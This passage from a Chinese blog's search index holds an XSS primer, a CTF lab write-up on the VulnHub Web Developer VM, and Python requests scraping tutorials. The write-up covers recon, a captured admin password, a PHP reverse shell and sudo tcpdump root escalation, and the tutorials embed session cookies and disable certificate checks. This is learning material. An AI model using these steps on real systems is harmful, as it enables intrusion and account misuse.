85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"XSS注入","slug":"xss注入","date":"2024-01-11T13:59:59.546Z","updated":"2024-01-11T14:14:00.389Z","comments":true,"path":"2024/01/11/xss注入/","permalink":"http://example.com/2024/01/11/xss%E6%B3%A8%E5%85%A5/","excerpt":"","text":"反射型反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 1234&lt;?php echo &quot;&lt;p&gt;hello,$_GET[&#x27;user&#x27;]&lt;/p&gt;&quot;; ?&gt;//如果未做防范XSS，用户名设为&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;,则会执行预设好的JavaScript代码。","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"实验四CTF实践","slug":"实验四 CTF实践","date":"2023-12-31T04:43:29.112Z","updated":"2023-12-31T05:09:50.656Z","comments":true,"path":"2023/12/31/实验四 CTF实践/","permalink":"http://example.com/2023/12/31/%E5%AE%9E%E9%AA%8C%E5%9B%9B%20CTF%E5%AE%9E%E8%B7%B5/","excerpt":"","text":"实验目的：通过对目标靶机的渗透过程，了解CTF竞赛模式，理解CTF涵盖的知识范围，如MISC、PPC、WEB等，通过实践，加强团队协作能力，掌握初步CTF实战能力及信息收集能力。熟悉网络扫描、探测HTTP web服务、目录枚举、提权、图像信息提取、密码破解等相关工具的使用。 系统环境：Kali Linux 2、WebDeveloper靶机来源：https://www.vulnhub.com/ 实验工具：不限 实验原理：1、什么是CTF CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯”。 1.1 CTF竞赛模式 （1）解题模式（Jeopardy）在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。 （2）攻防模式（Attack-Defense）在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 （3）混合模式（Mix）结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。 1.2 CTF各大题型简介 MISC（安全杂项） 全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广。 PPC（编程类） 全称Professionally Program Coder。题目涉及到程序编写、编程算法实现。算法的逆向编写，批量处理等，有时候用编程去处理问题，会方便的多。当然PPC相比ACM来说，还是较为容易的。至于编程语言嘛，推荐使用Python来尝试。这部分主要考察选手的快速编程能力。 CRYPTO（密码学） 全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。 REVERSE（逆向） 题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。 STEGA（隐写） 全称Steganography。题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛选手获取。载体就是图片、音频、视频等，可能是修改了这些载体来隐藏flag，也可能将flag隐藏在这些载体的二进制空白位置。有时候需要你侦探精神足够的强，才能发现。此类题目主要考查参赛选手的对各种隐写工具、隐写算法的熟悉程度。 PWN（溢出） PWN在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。在CTF比赛中，线上比赛会有，但是比例不会太重，进入线下比赛，逆向和溢出则是战队实力的关键。主要考察参数选手漏洞挖掘和利用能力。 WEB（web类） WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web*站开始的。 实验步骤和内容：目的：获取靶机Web Developer 文件&#x2F;root&#x2F;flag.txt中flag。 基本思路：本网段IP地址存活扫描(netdiscover)；网络扫描(Nmap)；浏览HTTP 服务；网站目录枚举(Dirb)；发现数据包文件 “cap”；分析 “cap” 文件，找到网站管理后台账号密码；插件利用（有漏洞）；利用漏洞获得服务器账号密码；SSH 远程登录服务器；tcpdump另类应用。 实施细节如下： 1、 发现目标(netdiscover)，找到WebDeveloper的IP地址。截图。回答：sudo netdiscover -i eth0 -r 192.168.1.0 192.168.1.103 2.利用NMAP描目标主机，发现目标主机端口开放、服务情况，截图并说明目标提供的服务有哪些？（利用第一次实验知识点）回答：22&#x2F;ssh 80&#x2F;http 3.若目标主机提供了HTTP服务，尝试利用浏览器访问目标网站。截图。是否有可用信息？ 4.利用whatweb探测目标网站使用的CMS模板。截图。分析使用的CMS是什么？回答：whatweb 192.168.1.103 CMS使用的是wordpress4.9.8 5.网络搜索wpscan，简要说明其功能。回答：WPScan是一个扫描 WordPress 漏洞的黑盒子扫描器，它可以为所有 Web 开发人员扫描 WordPress 漏洞并在他们开发前找到并解决问题。我们还使用了 Nikto ，它是一款非常棒的Web 服务器评估工具，我们认为这个工具应该成为所有针对 WordPress网站进行的渗透测试的一部分 6.使用 Dirb 爆破网站目录。（Dirb 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster， 国内的御剑）截图。找到一个似乎和网络流量有关的目录（路径）。回答：dirb http://192.168.1.103/ 7.浏览器访问该目录（路径），发现一个cap文件。截图。 8.利用Wireshark分析该数据包，分析TCP数据流。找到什么有用的信息？截图。回答：得到管理员账号&#x2F;密码webdeveloper&#x2F; Te5eQg&amp;4sBS!Yr$)wf%(DcAd 9.利用上一步得到的信息进入网站后台。截图。（网站管理员账号与操作系统账号是不同概念） 10.利用该CMS存在的（插件Plugin）漏洞。利用该插件漏洞提权。可选方案1：利用MeterSploit插件+reflex *gallery插件漏洞实现。安装reflex gallery插件。利用该插件可能存在的漏洞。***（课本知识点） 建立会话后，查看wp-config.php获得账号及口令。（配置文件很重要，各种系统的配置文件）。 获得的账号、口令是用来访问什么目标？注意与第7步描述比较。 回答：第七步得到的是网站管理员账户，这里得到的是系统账户 可选方案2：上传反弹shell http://pentestmonkey.net/tools/web-shells/php-reverse-shell 【目的：PHP网站渗透；实现途径：上传网站后，URL访问(含有)该反弹shell的页面。 功能：该脚本会发起反弹TCP连接到攻击者（脚本中指定攻击者IP地址和端口号）。】 该CMS为PHP开发，可以利用其实现反弹shell。但必须修改初始化IP地址和端口。（指向攻击者）。 进入后台，找到任意一个PHP页面，然后利用php-reverse-shell.PHP的代码修改该页面的代码。修改代码中反弹目标的IP地址及端口（修改为攻击者IP地址及开放的端口号）。 攻击者在Kali中利用NC开始监听，攻击者浏览器访问修改的PHP页面。从而得到反弹shell（用户www-data）。建立会话后，查看wp-config.php获得账号及口令。（注意路径） 方案3：利用文件管理插件（File manager）漏洞。安装该插件，直接可以浏览wp-config.php。 11.SSH登录服务器尝试利用上一步获得的访问数据库的用户名和密码连接远程服务器。截图。 1.尝试查看&#x2F;root&#x2F;flag.txt以下操作得到的结果截图替代以下截图。 均无法查看。 2.使用tcpdump执行任意命令（当tcpdump捕获到数据包后会执行指定的命令。）查看当前身份可执行的命令。 发现可以root权限执行tcpdump命令 创建攻击文件 1touch /tmp/exploit1 写入shellcode 1echo &#x27;cat /root/flag.txt&#x27; &gt; /tmp/exploit 赋予可执行权限 1chmod +x /tmp/exploit 利用tcpdump执行任意命令 1sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root 获得flag tcpdump命令详解： -i eth0 从指定网卡捕获数据包 -w &#x2F;dev&#x2F;null 将捕获到的数据包输出到空设备（不输出数据包结果） -z [command] 运行指定的命令 -Z [user] 指定用户执行命令 -G [rotate_seconds] 每rotate_seconds秒一次的频率执行-w指定的转储 -W [num] 指定抓包数量 实验小结通过本次CTF实战，模拟了如何在靶机中窃取需要的某个文件数据（flag.txt），让我知道渗透在现实生活中可能的应用。 靶机Web Developer和kali在同一个网段，我们首先使用netdiscover工具扫描该网段，寻找存活的目标靶机的IP地址。netdiscover是一个强大的网络发现工具，可以帮助我们快速找到网络中的存活主机。 一旦我们获得了目标靶机的IP地址，接下来使用nmap进行端口扫描。nmap是一个非常流行的网络扫描工具，它可以扫描指定主机的开放端口，帮助我们了解目标主机上运行的服务。通过扫描，我们发现目标靶机开放了80端口和22端口，分别是http服务和ssh服务。 根据开放端口的信息，我们猜测目标主机提供了一个http服务。为了验证这个猜测，我们尝试使用浏览器访问目标网站的域名。通过访问目标网站，我们可以进一步了解该网站使用的CMS（内容管理系统）模板。为了探测目标网站使用的CMS模板，我们使用了whatweb工具。whatweb是一个强大的网站侦查工具，它可以检测网站使用的CMS类型、插件等信息。通过whatweb的检测，我们发现该网站搭建使用的CMS模板是World press[4.9.8]。知道了目标网站使用的CMS模板后，我们可以利用wpscan工具扫描该网站存在的漏洞。wpscan是一个针对WordPress的漏洞扫描工具，它可以检测WordPress网站的各种漏洞，并提供修复建议。在扫描过程中，我们发现了一些潜在的漏洞。为了进一步利用这些漏洞，我们需要获取目标网站的目录结构。于是，我们利用kali自带的Dirb工具进行目录爆破。Dirb是一个目录枚举工具，它可以尝试猜测目标网站的目录结构，并帮助我们找到敏感文件或目录。在爆破过程中，我们发现了一个似乎跟网络流量有关的路径。为了验证这个路径是否包含有价值的信息，我们使用浏览器访问该路径。访问成功后，我们发现了一个cap文件，正好可以用wires hark打开进行流量分析。Wireshark是一款强大的网络协议分析器，它可以捕获网络流量并详细分析每个数据包的内容。在流量分析过程中，我们过滤了http中的要登录的post请求数据。通过分析这些数据包，我们发现了一些类似账号密码的信息。这些信息很可能是网站后台的登录账号密码。有了这些账号密码信息，我们尝试访问后台登录的url。成功登录进入后台后，我们进一步利用该CMS存在的（插件Plugin）漏洞进行提权操作。通过提权操作，我们可以访问到一些敏感文件，如config文件等。在这些文件中，我们发现了服务器的账号密码。有了服务器的账号密码，我们尝试使用ssh远程登录服务器访问数据库。在数据库中，我们尝试查找&#x2F;root&#x2F;flag.txt文件，但均无法查看。为了获取该文件的内容，我们使用了tcpdump进行抓包分析。通过抓包分析，我们成功提权并查看了flag文件的内容。","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"urllib与requests2","slug":"urllib与requests2","date":"2023-12-28T05:03:58.389Z","updated":"2023-12-28T06:28:49.718Z","comments":true,"path":"2023/12/28/urllib与requests2/","permalink":"http://example.com/2023/12/28/urllib%E4%B8%8Erequests2/","excerpt":"","text":"三、requests模块处理cookie相关的请求学习目标 掌握requests处理cookie的三种方法 1 爬虫中使用cookie 为了能够通过爬虫获取到登录后的页面，或者是解决通过cookie的反扒，需要使用request来处理cookie相关的请求 1.1 爬虫中使用cookie的利弊 带上cookie的好处 能够访问登录后的页面 能够实现部分反反爬 带上cookie的坏处 一套cookie往往对应的是一个用户的信息，请求太频繁有更大的可能性被对方识别为爬虫 那么上面的问题如何解决 ?使用多个账号 1.2 requests处理cookie的方法使用requests处理cookie有三种方法： cookie字符串放在headers中 把cookie字典放传给请求方法的cookies参数接收 使用requests提供的session模块 2、cookie添加在heades中2.1 headers中cookie的位置 headers中的cookie： 使用分号(;)隔开 分号两边的类似a&#x3D;b形式的表示一条cookie a&#x3D;b中，a表示键（name），b表示值（value） 在headers中仅仅使用了cookie的name和value 2.2 cookie的具体组成的字段 由于headers中对cookie仅仅使用它的name和value，所以在代码中我们仅仅需要cookie的name和value即可 2.3 在headers中使用cookie复制浏览器中的cookie到代码中使用 12345headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&quot;,&quot;Cookie&quot;:&quot; Pycharm-26c2d973=dbb9b300-2483-478f-9f5a-16ca4580177e; Hm_lvt_98b9d8c2fd6608d564bf2ac2ae642948=1512607763; Pycharm-26c2d974=f645329f-338e-486c-82c2-29e2a0205c74; _xsrf=2|d1a3d8ea|c5b07851cbce048bd5453846445de19d|1522379036&quot;&#125;requests.get(url,headers=headers) 注意：cookie有过期时间 ，所以直接复制浏览器中的cookie可能意味着下一程序继续运行的时候需要替换代码中的cookie，对应的我们也可以通过一个程序专门来获取cookie供其他程序使用；当然也有很多网站的cookie过期时间很长，这种情况下，直接复制cookie来使用更加简单 3、使用cookies参数接收字典形式的cookie cookies的形式：字典 1cookies = &#123;&quot;cookie的name&quot;:&quot;cookie的value&quot;&#125; 使用方法： 1requests.get(url,headers=headers,cookies=cookie_dict) 实例（爬取雪球网） 在网络中找到当前请求的网址 点击cookies 将当前的k,value复制到代码中 123456cookie_dict = &#123; &#x27;u&#x27;: &#x27;1990923459&#x27;, &#x27;bid&#x27;: &#x27;1f110dfd43538f4b8362dfcd21ffbb64_l27g4lfl&#x27;, &#x27;xq_is_login&#x27;: &#x27;1&#x27;, &#x27;xq_r_token&#x27;: &#x27;5dcbe83944f0b75325f91246061d4a2a01999367&#x27;&#125; 完整代码 1234567891011121314151617181920import requests# 携带cookie登录雪球网 抓取完善个人资料页面headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&#x27;, &#x27;Referer&#x27;: &#x27;https://xueqiu.com/u/1990923459&#x27;, &#x27;Host&#x27;: &#x27;xueqiu.com&#x27;,&#125;url = &#x27;https://xueqiu.com/users/connectnew?redirect=/setting/user&#x27;cookie_dict = &#123; &#x27;u&#x27;: &#x27;1990923459&#x27;, &#x27;bid&#x27;: &#x27;1f110dfd43538f4b8362dfcd21ffbb64_l27g4lfl&#x27;, &#x27;xq_is_login&#x27;: &#x27;1&#x27;, &#x27;xq_r_token&#x27;: &#x27;5dcbe83944f0b75325f91246061d4a2a01999367&#x27;&#125;res = requests.get(url, headers=headers, cookies=cookie_dict)with open(&#x27;雪球网.html&#x27;, &#x27;w&#x27;) as f: f.write(res.content.decode(&#x27;UTF-8&#x27;)) print(res.content.decode(&#x27;UTF-8&#x27;)) 成果 4、使用requests.session处理cookie 前面使用手动的方式使用cookie，那么有没有更好的方法在requets中处理cookie呢？ requests 提供了一个叫做session类，来实现客户端和服务端的会话保持 会话保持有两个内涵： 保存cookie，下一次请求会带上前一次的cookie 实现和服务端的长连接，加快请求速度 4.1 使用方法12session = requests.session()response = session.get(url,headers) session实例在请求了一个网站后，对方服务器设置在本地的cookie会保存在session中，下一次再使用session请求对方服务器的时候，会带上前一次的cookie 4.2 动手练习：模拟登陆 17k小说网 https://passport.17k.com/ 古诗文：https://so.gushiwen.cn 打码平台 图鉴 http://www.ttshitu.com/ 思路分析 准备url地址和请求参数 构造session发送post请求 使用session请求个人主页，观察是否请求成功 5、小结 cookie字符串可以放在headers字典中，键为Cookie，值为cookie字符串 可以把cookie字符串转化为字典，使用请求方法的cookies参数接收 使用requests提供的session模块，能够自动实现cookie的处理，包括请求的时候携带cookie，获取响应的时候保存cookie 四、requests模块的其他方法学习目标 掌握requests中cookirJar的处理方法 掌握requests解决https证书错误的问题 掌握requests中超时参数的使用 1、requests中cookirJar的处理方法 使用request获取的resposne对象，具有cookies属性，能够获取对方服务器设置在本地的cookie，但是如何使用这些cookie呢？ 1.1 方法介绍 response.cookies是CookieJar类型 使用requests.utils.dict_from_cookiejar，能够实现把cookiejar对象转化为字典 1.2 方法展示12345678910import requestsurl = &quot;http://www.baidu.com&quot;#发送请求，获取resposneresponse = requests.get(url)print(type(response.cookies))#使用方法从cookiejar中提取数据 等同于 dict(response.cookies)cookies = requests.utils.dict_from_cookiejar(response.cookies)print(cookies) 输出为: 12&lt;class &#x27;requests.cookies.RequestsCookieJar&#x27;&gt;&#123;&#x27;BDORZ&#x27;: &#x27;27315&#x27;&#125; 注意：在前面的requests的session类中，我们不需要处理cookie的任何细节，如果有需要，我们可以使用上述方法来解决 2、requests处理证书错误 经常我们在网上冲浪时，经常能够看到下面的提示： 出现这个问题的原因是：ssl的证书不安全导致 2.1 代码中发起请求的效果那么如果在代码中请求会怎么样呢？ 1234import requestsurl = &quot;https://www.12306.cn/mormhweb/&quot;response = requests.get(url) 返回证书错误，如下： 1ssl.CertificateError ... 2.2 解决方案为了在代码中能够正常的请求，我们修改添加一个参数 1234import requestsurl = &quot;https://www.12306.cn/mormhweb/&quot;response = requests.get(url, verify=False) 3、超时参数的使用 在平时网上冲浪的过程中，我们经常会遇到网络波动，这个时候，一个请求等了很久可能任然没有结果 在爬虫中，一个请求很久没有结果，就会让整个项目的效率变得非常低，这个时候我们就需要对请求进行强制要求，让他必须在特定的时间内返回结果，否则就报错 3.1 超时参数使用方法如下：1response = requests.get(url,timeout=3) 通过添加timeout参数，能够保证在3秒钟内返回响应，否则会报错 注意：这个方法还能够拿来检测代理ip的质量，如果一个代理ip在很长时间没有响应，那么添加超时之后也会报错，对应的这个ip就可以从代理ip池中删除","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"urllib与requests1","slug":"urllib与requests1","date":"2023-12-28T05:03:47.684Z","updated":"2023-12-28T06:28:21.385Z","comments":true,"path":"2023/12/28/urllib与requests1/","permalink":"http://example.com/2023/12/28/urllib%E4%B8%8Erequests1/","excerpt":"","text":"urllib与requests一、urllib的学习学习目标了解urllib的基本使用 1、urllib介绍除了requests模块可以发送请求之外, urllib模块也可以实现请求的发送,只是操作方法略有不同! urllib在python中分为urllib和urllib2，在python3中为urllib 下面以python3的urllib为例进行讲解 2、urllib的基本方法介绍2.1 urllib.Request 构造简单请求 12345import urllib#构造请求request = urllib.request.Request(&quot;http://www.baidu.com&quot;)#发送请求获取响应response = urllib.request.urlopen(request) 传入headers参数 1234567import urllib#构造headersheaders = &#123;&quot;User-Agent&quot; : &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&quot;&#125; #构造请求request = urllib.request.Request(url, headers = headers)#发送请求response = urllib.request.urlopen(request) 传入data参数 实现发送post请求（示例） 123456789101112131415161718192021222324import urllib.requestimport urllib.parseimport jsonurl = &#x27;https://ifanyi.iciba.com/index.php?c=trans&amp;m=fy&amp;client=6&amp;auth_user=key_ciba&amp;sign=99730f3bf66b2582&#x27;headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15&#x27;,&#125;data = &#123; &#x27;from&#x27;: &#x27;zh&#x27;, &#x27;to&#x27;: &#x27;en&#x27;, &#x27;q&#x27;: &#x27;lucky 是一个帅气的老&#x27;&#125;# 使用post方式# 需要data = urllib.parse.urlencode(data).encode(&#x27;utf-8&#x27;)req = urllib.request.Request(url, data=data, headers=headers)res = urllib.request.urlopen(req)print(res.getcode())print(res.geturl())data = json.loads(res.read().decode(&#x27;utf-8&#x27;))print(data) 2.2 response.read()获取响应的html字符串,bytes类型 1234#发送请求response = urllib.request.urlopen(&quot;http://www.baidu.com&quot;)#获取响应response.read() 3、urllib请求百度首页的完整例子12345678910111213import urllibimport jsonurl = &#x27;http://www.baidu.com&#x27;#构造headersheaders = &#123;&quot;User-Agent&quot; : &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&quot;&#125;#构造请求request = urllib.request.Request(url, headers = headers)#发送请求response = urllib.request.urlopen(request)#获取html字符串html_str = response.read().decode(&#x27;utf-8&#x27;)print(html_str) 4、小结 urllib.request中实现了构造请求和发送请求的方法 urllib.request.Request(url,headers,data)能够构造请求 urllib.request.urlopen能够接受request请求或者url地址发送请求，获取响应 response.read()能够实现获取响应中的bytes字符串 requests模块的入门使用一、requests模块的入门使用学习目标： 了解 requests模块的介绍 掌握 requests的基本使用 掌握 response常见的属性 掌握 requests.text和content的区别 掌握 解决网页的解码问题 掌握 requests模块发送带headers的请求 掌握 requests模块发送带参数的get请求 1、为什么要重点学习\brequests模块，而不是urllib 企业中用的最多的就是requests requests的底层实现就是urllib requests在python2 和python3中通用，方法完全一样 requests简单易用 2、requests的作用与安装作用：发送网络请求，返回响应数据 安装：pip install requests 3、requests模块发送简单的get请求、获取响应需求：通过requests向百度首页发送请求，获取百度首页的数据 12345678910import requests# 目标urlurl = &#x27;https://www.baidu.com&#x27;# 向目标url发送get请求response = requests.get(url)# 打印响应内容print(response.text) response的常用属性： response.text 响应体 str类型 response.encoding 从HTTP header中猜测的响应内容的编码方式 respones.content 响应体 bytes类型 response.status_code 响应状态码 response.request.headers 响应对应的请求头 response.headers 响应头 response.cookies 响应的cookie（经过了set-cookie动作） response.url 获取访问的url response.json() 获取json数据 得到内容为字典 (如果接口响应体的格式是json格式时) response.ok 如果status_code小于200，response.ok返回True。 如果status_code大于200，response.ok返回False。 思考：text是response的属性还是方法呢？ 一般来说名词，往往都是对象的属性，对应的动词是对象的方法 3.1 response.text 和response.content的区别 response.text 类型：str 解码类型： requests模块自动根据HTTP 头部对响应的编码作出有根据的推测，推测的文本编码 如何修改编码方式：response.encoding=&quot;gbk/UTF-8&quot; response.content 类型：bytes 解码类型： 没有指定 如何修改编码方式：response.content.deocde(&quot;utf8&quot;) 获取网页源码的通用方式： response.content.decode() response.content.decode(&quot;UTF-8&quot;) response.text 以上三种方法从前往后尝试，能够100%的解决所有网页解码的问题 所以：更推荐使用response.content.deocde()的方式获取响应的html页面 3.2 练习：把网络上的图片保存到本地 我们来把www.baidu.com的图片保存到本地 思考： 以什么方式打开文件 保存什么格式的内容 分析： 图片的url: https://www.baidu.com/img/bd_logo1.png 利用requests模块发送请求获取响应 以2进制写入的方式打开文件，并将response响应的二进制内容写入 1234567891011121314import requests# 图片的urlurl = &#x27;https://www.baidu.com/img/bd_logo1.png&#x27;# 响应本身就是一个图片,并且是二进制类型response = requests.get(url)# print(response.content)# 以二进制+写入的方式打开文件with open(&#x27;baidu.png&#x27;, &#x27;wb&#x27;) as f: # 写入response.content bytes二进制类型 f.write(response.content) 4、发送带header的请求 我们先写一个获取百度首页的代码 12345678910import requestsurl = &#x27;https://www.baidu.com&#x27;response = requests.get(url)print(response.content)# 打印响应对应请求的请求头信息print(response.request.headers) 4.1 思考对比浏览器上百度首页的网页源码和代码中的百度首页的源码，有什么不同？ 代码中的百度首页的源码非常少，为什么？ 4.2 为什么请求需要带上header？模拟浏览器，欺骗服务器，获取和浏览器一致的内容 4.3 header的形式：字典1headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;&#125; 4.4 用法1requests.get(url, headers=headers) 4.5 完整的代码12345678910111213import requestsurl = &#x27;https://www.baidu.com&#x27;headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;&#125;# 在请求头中带上User-Agent，模拟浏览器发送请求response = requests.get(url, headers=headers)# print(response.content)# 打印请求头信息print(response.request.headers) 5、发送带参数的请求 我们在使用百度搜索的时候经常发现url地址中会有一个 ?，那么该问号后边的就是请求参数，又叫做查询字符串 5.1 什么叫做请求参数：例1： http://www.webkaka.com/tutorial/server/2015/021013/ 例2：https://www.baidu.com/s?wd=python&amp;a=c 例1中没有请求参数！例2中?后边的就是请求参数 5.2 请求参数的形式：字典1kw = &#123;&#x27;wd&#x27;:&#x27;长城&#x27;&#125; 5.3 请求参数的用法1requests.get(url,params=kw) 5.4 关于参数的注意点在url地址中， 很多参数是没有用的，比如百度搜索的url地址，其中参数只有一个字段有用，其他的都可以删除 如何确定那些请求参数有用或者没用：挨个尝试！ 对应的,在后续的爬虫中，越到很多参数的url地址，都可以尝试删除参数 5.5 两种方式：发送带参数的请求 对https://www.baidu.com/s?wd=python发起请求可以使用requests.get(url, params=kw)的方式 1234567891011121314151617181920# 方式一：利用params参数发送带参数的请求import requestsheaders = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;&#125;# 这是目标url# url = &#x27;https://www.baidu.com/s?wd=python&#x27;# 最后有没有问号结果都一样url = &#x27;https://www.baidu.com/s?&#x27;# 请求参数是一个字典 即wd=pythonkw = &#123;&#x27;wd&#x27;: &#x27;python&#x27;&#125;# 带上请求参数发起请求，获取响应response = requests.get(url, headers=headers, params=kw)# 当有多个请求参数时，requests接收的params参数为多个键值对的字典，比如 &#x27;?wd=python&amp;a=c&#x27;--&gt;&#123;&#x27;wd&#x27;: &#x27;python&#x27;, &#x27;a&#x27;: &#x27;c&#x27;&#125;print(response.content) 也可以直接对https://www.baidu.com/s?wd=python完整的url直接发送请求，不使用params参数 1234567891011# 方式二：直接发送带参数的url的请求import requestsheaders = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;&#125;url = &#x27;https://www.baidu.com/s?wd=python&#x27;# kw = &#123;&#x27;wd&#x27;: &#x27;python&#x27;&#125;# url中包含了请求参数，所以此时无需paramsresponse = requests.get(url, headers=headers) 6、小结 requests模块的介绍：能够帮助我们发起请求获取响应 requests的基本使用：requests.get(url) 以及response常见的属性： response.text 响应体 str类型 respones.content 响应体 bytes类型 response.status_code 响应状态码 response.request.headers 响应对应的请求头 response.headers 响应头 response.request._cookies 响应对应请求的cookie response.cookies 响应的cookie（经过了set-cookie动作） 掌握 requests.text和content的区别：text返回str类型，content返回bytes类型 掌握 解决网页的解码问题： response.content.decode() response.content.decode(&quot;UTF-8&quot;) response.text 掌握 requests模块发送带headers的请求：requests.get(url, headers=&#123;&#125;) 掌握 requests模块发送带参数的get请求：requests.get(url, params=&#123;&#125;) 二、requests模块的深入使用学习目标： 能够应用requests发送post请求的方法 能够应用requests模块使用代理的方法 了解代理ip的分类 1、使用requests发送POST请求 思考：哪些地方我们会用到POST请求？ 登录注册（ POST 比 GET 更安全） 需要传输大文本内容的时候（ POST 请求对数据长度没有要求） 所以同样的，我们的爬虫也需要在这两个地方回去模拟浏览器发送post请求 1.1 requests发送post请求语法： 用法： 1response = requests.post(&quot;http://www.baidu.com/&quot;, data = data, headers=headers) data 的形式：字典 1.2 POST请求练习下面面我们通过金山翻译的例子看看post请求如何使用： 地址：https://www.iciba.com/fy 思路分析 抓包确定请求的url地址 ![截屏2022-04-20 下午3.22.11](..&#x2F;images&#x2F;requests1.assets&#x2F;截屏2022-04-20 下午3.22.11.png) 确定请求的参数 ![截屏2022-04-20 下午3.23.07](..&#x2F;images&#x2F;requests1.assets&#x2F;截屏2022-04-20 下午3.23.07.png) 确定返回数据的位置 模拟浏览器获取数据 